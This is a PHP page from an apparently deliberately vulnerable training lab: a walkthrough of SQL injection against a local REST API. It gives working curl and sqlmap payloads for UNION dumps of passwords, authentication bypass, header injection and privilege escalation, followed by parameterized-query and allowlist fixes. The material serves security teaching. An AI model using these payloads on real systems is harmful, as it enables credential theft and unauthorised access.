<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">API SQL Injection</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">11. API SQL Injection</h2>
  <span class="badge bg-primary">API</span>
  <span class="badge bg-secondary">REST</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>REST APIs are equally vulnerable to SQL injection as web forms — the difference is that input comes via URL parameters, JSON body, and HTTP headers rather than HTML form fields. Many developers apply input validation to forms but forget API endpoints entirely.</p>
    <p class="mb-0"><strong>Base URL:</strong> <code>http://localhost:8080/api/</code> | <strong>Endpoints:</strong> users.php, search.php, login.php, user_update.php</p>
  </div>
</div>

<div class="card mb-4 border-primary">
  <div class="card-header bg-primary text-white"><strong>Attack Surface Map</strong></div>
  <div class="card-body">
    <table class="table table-sm table-bordered small mb-0">
      <thead class="table-dark"><tr><th>Endpoint</th><th>Method</th><th>Injection Point</th><th>Type</th></tr></thead>
      <tbody>
        <tr><td><code>/api/users.php</code></td><td>GET</td><td><code>?id=</code></td><td>Integer — UNION, error, blind, time</td></tr>
        <tr><td><code>/api/users.php</code></td><td>GET</td><td><code>?role=</code></td><td>String — tautology bypass</td></tr>
        <tr><td><code>/api/users.php</code></td><td>GET</td><td><code>?sort=</code></td><td>ORDER BY injection</td></tr>
        <tr><td><code>/api/users.php</code></td><td>GET</td><td><code>?search=</code></td><td>LIKE injection — UNION</td></tr>
        <tr><td><code>/api/search.php</code></td><td>GET</td><td><code>?limit=</code></td><td>LIMIT clause injection</td></tr>
        <tr><td><code>/api/login.php</code></td><td>POST</td><td>JSON <code>email</code></td><td>Auth bypass</td></tr>
        <tr><td><code>/api/login.php</code></td><td>POST</td><td><code>X-Forwarded-For</code> header</td><td>Header injection into audit log</td></tr>
        <tr><td><code>/api/user_update.php</code></td><td>PUT</td><td>JSON <code>firstname</code></td><td>UPDATE SET injection</td></tr>
        <tr><td><code>/api/user_update.php</code></td><td>PUT</td><td>JSON <code>account_type</code></td><td>Mass assignment</td></tr>
      </tbody>
    </table>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">1. GET parameter — integer injection (UNION dump)</h6>
    <pre class="bg-light p-2 rounded small">curl -g "http://localhost:8080/api/users.php?id=1 UNION SELECT 1,email,password,account_type,5,6 FROM user--"</pre>

    <h6 class="fw-bold mt-3">2. GET parameter — error-based extraction</h6>
    <pre class="bg-light p-2 rounded small">curl -g "http://localhost:8080/api/users.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))"</pre>

    <h6 class="fw-bold mt-3">3. ORDER BY injection — column enumeration</h6>
    <pre class="bg-light p-2 rounded small"># Leak password column by including it in sort
curl "http://localhost:8080/api/users.php?sort=password"
# Returns results ordered by password — password values visible in response order</pre>

    <h6 class="fw-bold mt-3">4. POST JSON — auth bypass</h6>
    <pre class="bg-light p-2 rounded small">curl -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}'</pre>

    <h6 class="fw-bold mt-3">5. HTTP header injection (X-Forwarded-For into audit log)</h6>
    <pre class="bg-light p-2 rounded small">curl -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.2.3.4', (SELECT password FROM user LIMIT 1), NOW())--" \
  -d '{"email":"test@test.com","password":"x"}'
# The malicious IP value is injected into the audit log INSERT query</pre>

    <h6 class="fw-bold mt-3">6. LIMIT clause injection</h6>
    <pre class="bg-light p-2 rounded small">curl "http://localhost:8080/api/search.php?limit=1 UNION SELECT 1,email,password,4 FROM user--"</pre>

    <h6 class="fw-bold mt-3">7. PUT body — privilege escalation via SET injection</h6>
    <pre class="bg-light p-2 rounded small">curl -X PUT http://localhost:8080/api/user_update.php \
  -H "Content-Type: application/json" \
  -d '{"id":1,"firstname":"x'"'"', account_type='"'"'admin'"'"' WHERE id=1--","lastname":"y"}'</pre>

    <h6 class="fw-bold mt-3">8. sqlmap — automated scan of all endpoints</h6>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/api/users.php?id=1" --dbs --batch
sqlmap -u "http://localhost:8080/api/users.php?id=1&role=user&sort=id" --level=3 --dump --batch
sqlmap -u "http://localhost:8080/api/login.php" \
  --data='{"email":"test@test.com","password":"x"}' \
  --headers="Content-Type: application/json" -p email --dbs --batch</pre>

    <a href="../api/index.php" target="_blank" class="btn btn-sm btn-outline-primary">Open API Docs →</a>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix — Safe API Patterns</strong></div>
  <div class="card-body">
    <p><strong>1. Parameterize all queries:</strong></p>
    <pre class="bg-light p-2 rounded small">// VULNERABLE
$sql = "SELECT * FROM user WHERE id = {$_GET['id']}";

// SAFE
$stmt = $pdo->prepare("SELECT * FROM user WHERE id = :id");
$stmt->execute([':id' => (int) $_GET['id']]);</pre>

    <p class="mt-3"><strong>2. Validate and allowlist ORDER BY:</strong></p>
    <pre class="bg-light p-2 rounded small">$allowed_sorts = ['id', 'firstname', 'lastname', 'email'];
$sort = in_array($_GET['sort'], $allowed_sorts) ? $_GET['sort'] : 'id';
$sql = "SELECT * FROM user ORDER BY {$sort}";  // safe — from allowlist only</pre>

    <p class="mt-3"><strong>3. Sanitize HTTP headers before DB use:</strong></p>
    <pre class="bg-light p-2 rounded small">$ip = filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP) ?: '0.0.0.0';
$stmt = $pdo->prepare("INSERT INTO login_log (email, ip) VALUES (:email, :ip)");
$stmt->execute([':email' => $email, ':ip' => $ip]);</pre>

    <p class="mt-3"><strong>4. Block mass assignment — use explicit field lists:</strong></p>
    <pre class="bg-light p-2 rounded small">// Never pass all body fields through to DB
// Explicitly list which fields can be updated:
$allowed = ['firstname', 'lastname', 'phone'];
$data = array_intersect_key($body, array_flip($allowed));
// account_type is never in this list</pre>

    <p class="mt-3"><strong>5. Don't expose SQL in responses:</strong></p>
    <pre class="bg-light p-2 rounded small">// Remove these from API responses:
// 'query' => $sql,   ← never expose raw queries
// 'error' => $e->getMessage()  ← log internally, return generic error</pre>
  </div>
</div>
